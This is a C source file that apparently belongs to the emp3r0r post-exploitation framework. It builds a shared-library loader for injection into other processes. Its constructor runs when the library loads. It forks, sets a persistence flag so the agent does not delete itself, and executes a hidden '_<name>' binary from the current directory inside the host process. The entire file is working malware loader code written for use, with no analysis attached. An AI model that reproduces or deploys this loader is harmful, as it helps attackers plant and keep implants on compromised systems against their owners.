#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void __attribute__((constructor)) initLibrary(void) {
  pid_t child = fork();
  if (child == 0) {
    puts("Loading emp3r0r...");

    // prevent self delete of agent
    // see cmd/agent/main.go
    setenv("PERSISTENCE", "true", 1);

    // where to read target ELF file
    // this should be in sync with emp3r0r inject_loader module
    char exe[1024];
    if (readlink("/proc/self/exe", exe, 1024) < 0) {
      perror("readlink");
      return;
    }
    const char *exe_name = basename(exe);
    char elf_path[1024]; // path to target ELF file
    const char *cwd = getcwd(NULL, 0);
    // decides where to get target ELF binary
    snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);

    // Run the ELF
    char *argv[] = {exe, NULL};
    char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp", NULL};
    printf("Exec: %s\n", elf_path);
    if (execve(elf_path, argv, envv) < 0) {
      perror("execve");
    }
  }
}

void __attribute__((destructor)) cleanUpLibrary(void) {}
